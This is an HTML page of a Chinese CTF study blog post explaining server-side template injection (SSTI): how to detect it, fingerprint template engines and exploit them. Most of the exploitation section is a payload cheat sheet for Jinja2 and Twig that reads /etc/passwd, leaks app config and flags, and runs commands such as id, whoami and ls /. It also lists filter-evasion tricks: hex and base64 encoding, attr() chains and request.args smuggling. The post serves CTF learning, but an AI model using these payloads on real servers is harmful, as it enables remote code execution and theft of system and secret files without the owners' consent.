<!-- build time:Thu May 26 2022 22:55:15 GMT+0800 (香港标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="imFanqie" href="http://imfanqie.top/rss.xml"><link rel="alternate" type="application/atom+xml" title="imFanqie" href="http://imfanqie.top/atom.xml"><link rel="alternate" type="application/json" title="imFanqie" href="http://imfanqie.top/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="SSTI"><link rel="canonical" href="http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><title>ctfweb-SSTI服务器模板注入 - SSTI模板注入 - WEB - CTF | FanqieのBlog = imFanqie</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">ctfweb-SSTI服务器模板注入</h1><div class="meta"><span class="item" title="创建时间：2021-11-23 19:57:15"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-11-23T19:57:15+08:00">2021-11-23</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>8k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>7 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">FanqieのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">主页·home</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ctf/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ctf/web/" itemprop="item" rel="index" title="分类于 WEB"><span itemprop="name">WEB</span></a><meta itemprop="position" content="2"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ctf/web/ssti/" itemprop="item" rel="index" title="分类于 SSTI模板注入"><span itemprop="name">SSTI模板注入</span></a><meta itemprop="position" content="3"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Fanqie"><meta itemprop="description" content=", 学习博客"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="imFanqie"></span><div class="body md" itemprop="articleBody"><p>简单学习了一下 ssti，这方面可以说是很烦了:（</p><p><span id="more"></span></p><h2 id="概述"><a class="anchor" href="#概述">#</a> 概述</h2><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p><p><strong>在考虑进行模板注入之前，我们需要进行漏洞探测</strong></p><h2 id="探测漏洞"><a class="anchor" href="#探测漏洞">#</a> 探测漏洞</h2><h3 id="1文本类"><a class="anchor" href="#1文本类">#</a> 1. 文本类</h3><p>大部分的模板语言支持我们输入 HTML，未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。</p><p>例如，考虑一个包含以下易受攻击的代码的模板：</p><pre><code>render('Hello ' + username)
</code></pre><p>我们可以发送如下 payload：</p><pre><code>&#123;7*7&#125;
</code></pre><p>或者通过请求 URL 来测试服务器端模板的注入：</p><pre><code>/?username=$&#123;7*7&#125;
</code></pre><p>如果结果输出包含 <code>Hello 49</code> ，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。</p><h3 id="2代码类"><a class="anchor" href="#2代码类">#</a> 2. 代码类</h3><p>在一些环境下，用户的输入也会被当作模板的可执行代码。</p><p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的 HTML 标签以确认漏洞：</p><pre><code>/?greeting=data.username
</code></pre><p>在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是<strong> Hello</strong> 没有用户名），编码标签或错误消息。</p><p>下一步是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：</p><pre><code>/?greeting=data.username&#125;&#125;&lt;tag&gt;
</code></pre><p>如果再次导致错误或空白输出，则说明使用了错误的模板语言提供的语法，或者，如果没有模板样式的语法似乎有效，则无法进行服务器端模板注入。</p><p>或者，如果输出和任意 HTML 一起正确呈现，则表明存在服务器端模板注入漏洞：</p><pre><code class="language-text">Hello user01 &lt;tag&gt;
</code></pre><h2 id="确认模板"><a class="anchor" href="#确认模板">#</a> 确认模板</h2><p>一旦检测到模板注入潜力，下一步就是确定模板引擎。</p><p>尽管有大量的模板语言，但是其中许多模板使用非常相似的语法，而这些语法是专门为不与 HTML 字符冲突而选择的。</p><p>通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 <code>&lt;%=foobar%&gt;</code> 从基于 Ruby 的 ERB 引擎触发以下响应：</p><pre><code>(erb):1:in `&lt;main&gt;': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `&lt;main&gt;'
</code></pre><p>否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。</p><p><img data-src="https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg" alt></p><p>这里的绿线表示结果成功返回，红线反之。</p><p>相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 <code>&#123; &#123;7*'7'&#125; &#125;</code> 在 Twig 中返回<strong> 49</strong>，在 Jinja2 中返回<strong> 7777777</strong>。</p><h2 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h2><h3 id="1读文档"><a class="anchor" href="#1读文档">#</a> <strong>1. 读文档</strong></h3><p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p><ul><li>'Template 使用手册 '，这一部分通常告诉我们基本的模板语法</li><li>' 安全问题 '，在攻击模板时，它通常可以提供我们许多思路</li><li>内建方法，函数，变量，过滤器</li><li>插件 / 扩展 —— 我们可以优先研究默认开启的</li></ul><h3 id="2探环境"><a class="anchor" href="#2探环境">#</a> <strong>2. 探环境</strong></h3><p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数 / 对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p><p>如果没有这样的对象或函数，我们需要暴力枚举变量名。</p><p>有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。</p><h3 id="3黑程序"><a class="anchor" href="#3黑程序">#</a> 3.<strong> 黑程序</strong></h3><p php>有些时候，攻破一个程序不需要多少时间，比如：{php} echo id;</p><p>这时，我们只需递交：</p><pre><code>&lt;%
import os
x=os.popen('id').read()
%&gt;
$&#123;x&#125;
</code></pre><p>即可</p><p>但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p><h2 id="常见模板"><a class="anchor" href="#常见模板">#</a> 常见模板</h2><p>下图为<strong>常见模板结构</strong>：</p><p><img data-src="https://img-blog.csdnimg.cn/20200803104657237.png" alt></p><h3 id="1jinja2"><a class="anchor" href="#1jinja2">#</a> 1.jinja2</h3><h4 id="常用函数"><a class="anchor" href="#常用函数">#</a> <strong>常用函数</strong></h4><pre><code>__dict__            保存类实例或对象实例的属性变量键值对字典
__class__           返回类型所属的对象(返回调用的参数类型)
__mro__             返回一个包含对象所继承的基类元组(返回类型列表)，方法在解析时按照元组的顺序解析。
__bases__           返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__      每个新类都保留了子类的引用(返回object的子类)，这个方法返回一个类中仍然可用的的引用的列表
__init__            类的初始化方法
__globals__         对包含函数全局变量的字典的引用
</code></pre><h4 id="payload"><a class="anchor" href="#payload">#</a> payload</h4><p>获取基本类</p><pre><code>''.__class__.__mro__[2]
&#123;&#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
</code></pre><p>获取基本类后，继续向下获取基本类 (object) 的子类</p><pre><code>object.__subclasses__()
</code></pre><p>存在的子模块可以通过.index () 来进行查询，如果存在的话返回索引，直接调用即可</p><pre><code>''.__class__.__mro__[2].__subclasses__().index(file)
40
</code></pre><p>然后通过.read 读取文件即可（py2）</p><pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件
</code></pre><h4 id="payload总结"><a class="anchor" href="#payload总结">#</a> <strong>payload 总结</strong></h4><p><strong>python2</strong></p><pre><code>&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125; &#125;                             //文件读取

&#123; &#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125; &#125;              //文件读取

&#123; &#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;app\x2Epy&quot;)&#125; &#125;                                    

&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').system('whoami')&quot;)&#125; &#125;               //命令执行

&#123; &#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[80][&quot;load\x5Fmodule&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)&#125; &#125;

&#123; &#123;request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()&#125; &#125;                               //命令执行
</code></pre><p><strong>python3</strong></p><pre><code>//命令执行
&#123; % for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('id').read()&quot;) &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;
//文件操作
&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;
</code></pre><p>拼接查找目录</p><pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;
</code></pre><p>查找根目录 -------------------------------</p><pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123; % endif % &#125;&#123; % endfor % &#125;
</code></pre><p><strong>开头的都是 class 什么的，说明是 python3 写的 flask。因为 py2 写的话，开头的都是 type。</strong></p><p><strong>python2 下有 file 而在 python3 下已经没有了，所以是直接用 open。</strong></p><p>更详细的方法查看参考链接第五条 <span class="exturl" data-url="aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==">浅析 SSTI (python 沙盒绕过)</span></p><h4 id="常见绕过"><a class="anchor" href="#常见绕过">#</a> <strong>常见绕过</strong></h4><p>​	<em><strong>1. 绕过中括号</strong></em></p><p>pop () 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p><pre><code>&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
</code></pre><p>在这里使用 pop 并不会真的移除，但却能返回其值，取代中括号，来实现绕过。</p><p>​ <em><strong>2. 过滤引号</strong></em></p><p><code>request.args</code> 是 flask 中的一个属性，为返回请求的参数，这里把 <code>path</code> 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤</p><pre><code>&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;pat
</code></pre><p>​	<em><strong>3. 过滤</strong></em> { {<em><strong>或者</strong></em>} }</p><p>可以使用 { % 绕过，<br><code>&#123; % % &#125;</code> 中间可以执行 if 语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</p><pre><code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;1&#123; % endif % &#125;
</code></pre><p>​	<strong>4. 过滤_</strong></p><p>用编码绕过</p><pre><code>__class__ =&gt; \x5f\x5fclass\x5f\x5f
</code></pre><p>_ 是 \x5f，. 是 \x2E 如果也过滤了</p><p>可以用利用 <code>request.args</code> 属性</p><pre><code> &#123; &#123;''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125; &#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
</code></pre><p>将其中的 <code>request.args</code> 改为 <code>request.values</code> 则利用 post 的方式进行传参</p><p>​	<em><strong>5. 过滤.</strong></em></p><p>. 在 payload 中是很重要的，但是我们依旧可以采用 attr () 绕过<br>举例</p><pre><code>url?name=&#123; &#123;().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()')&#125; &#125;
</code></pre><p>使用 attr () 绕过：</p><pre><code>&#123; &#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()')&#125; &#125;
</code></pre><p>​	<em><strong>6. 绕过 config 参数</strong></em></p><p><code>&#123; &#123;config&#125; &#125;</code> 可以获取当前设置，如果题目类似</p><pre><code>app.config ['FLAG'] = os.environ.pop（'FLAG'）
</code></pre><p>那可以直接访问</p><pre><code>&#123; &#123;config['FLAG']&#125; &#125;   或者   &#123; &#123;config.FLAG&#125; &#125;
</code></pre><p>得到 flag。但是如果被过滤了，则</p><pre><code>&#123; &#123;self&#125; &#125; ⇒ &lt;TemplateReference None&gt;
&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125; 
</code></pre><p>同样可以找到 config</p><p>​	<em><strong>7. 关键字过滤</strong></em></p><p>base64 编码绕过<br><code>__getattribute__</code> 使用实例访问属性时，调用该方法</p><p>例如被过滤掉 <code>__class__</code> 关键词</p><pre><code>&#123; &#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125;
</code></pre><p>字符串拼接绕过</p><pre><code>&#123; &#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125; 
//不对就加join

&#123; &#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125; &#125;
</code></pre><h3 id="2smarty"><a class="anchor" href="#2smarty">#</a> 2.smarty</h3><p>Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用 system ()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置 $SCRIPT_NAME)。</p><p>参考文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lYjhkMDEzN2E3ZDM=">ctf 中 smarty 介绍与例题</span></p><p>smarty，应用比较少。</p><h3 id="3twig"><a class="anchor" href="#3twig">#</a> <strong>3.twig</strong></h3><p><strong>文件读取</strong></p><pre><code>&#123; &#123;'/etc/passwd'|file_excerpt(1,30)&#125; &#125;

&#123; &#123;app.request.files.get(1).__construct('/etc/passwd','')&#125; &#125;
&#123; &#123;app.request.files.get(1).openFile.fread(99)&#125; &#125;
</code></pre><p><strong>rce</strong></p><pre><code>&#123; &#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125; &#125;&#123; &#123;_self.env.getFilter(&quot;id&quot;)&#125; &#125;   （cat /flag ）

&#123; &#123;['cat /etc/passwd']|filter('system')&#125; &#125;

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
&#123; &#123;app.request.query.filter(0,0,1024,&#123;'options':'system'&#125;)&#125; &#125;
</code></pre><h3 id="4其他模板"><a class="anchor" href="#4其他模板">#</a> 4. 其他模板</h3><p>参考链接 <span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p><p>对各个模板有讲解</p><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI0NjgzMi5odG1s">细说服务器端模板注入（SSTI） - FreeBuf 网络安全行业门户</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s">CTF SSTI (服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzE4Nzg0NS5odG1s">从零学习 flask 模板注入</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRpL2FydGljbGUvZGV0YWlscy8xMDc3NTI3MTc=">SSTI 模板注入及绕过姿势 (基于 Python-Jinja2)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==">浅析 SSTI (python 沙盒绕过)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDY2MzkxMTE=">https://blog.csdn.net/qq_45521281/article/details/106639111</span></p><p>附：读者可辅助参考的文章</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHktLTEvcC8xMjg0MTk0MS5odG1s">SSTI 学习</span></p><hr><p>END</p><div class="tags"><a href="/tags/SSTI/" rel="tag"><i class="ic i-tag"></i> SSTI</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2021-12-04 18:42:22" itemprop="dateModified" datetime="2021-12-04T18:42:22+08:00">2021-12-04</time> </span><span id="2021/11/23/ctf/web/ssti/ctfweb-SSTI服务器模板注入/" class="item leancloud_visitors" data-flag-title="ctfweb-SSTI服务器模板注入" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="Fanqie 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="Fanqie 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Fanqie <i class="ic i-at"><em>@</em></i>imFanqie</li><li class="link"><strong>本文链接：</strong> <a href="http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="ctfweb-SSTI服务器模板注入">http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI服务器模板注入/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2021/10/23/ctf/crypto&misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclize41wj20zk0m87gk.jpg" title="CRYPTO——密码的取经之路"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 密码总结</span><h3>CRYPTO——密码的取经之路</h3></a></div><div class="item right"><a href="/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfb3vzhj20zk0m8wny.jpg" title="wsl2安装使用及debug心得"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> wsl</span><h3>wsl2安装使用及debug心得</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">探测漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%96%87%E6%9C%AC%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">1. 文本类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E4%BB%A3%E7%A0%81%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">2. 代码类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.</span> <span class="toc-text">确认模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%AF%BB%E6%96%87%E6%A1%A3"><span class="toc-number">4.1.</span> <span class="toc-text">1. 读文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%8E%A2%E7%8E%AF%E5%A2%83"><span class="toc-number">4.2.</span> <span class="toc-text">2. 探环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E9%BB%91%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.3.</span> <span class="toc-text">3. 黑程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF"><span class="toc-number">5.</span> <span class="toc-text">常见模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1jinja2"><span class="toc-number">5.1.</span> <span class="toc-text">1.jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">5.1.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.3.</span> <span class="toc-text">payload 总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.4.</span> <span class="toc-text">常见绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2smarty"><span class="toc-number">5.2.</span> <span class="toc-text">2.smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3twig"><span class="toc-number">5.3.</span> <span class="toc-text">3.twig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF"><span class="toc-number">5.4.</span> <span class="toc-text">4. 其他模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="bookmark" title="(ctfwp)buu中ssti模板注入">(ctfwp)buu中ssti模板注入</a></li><li class="active"><a href="/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="bookmark" 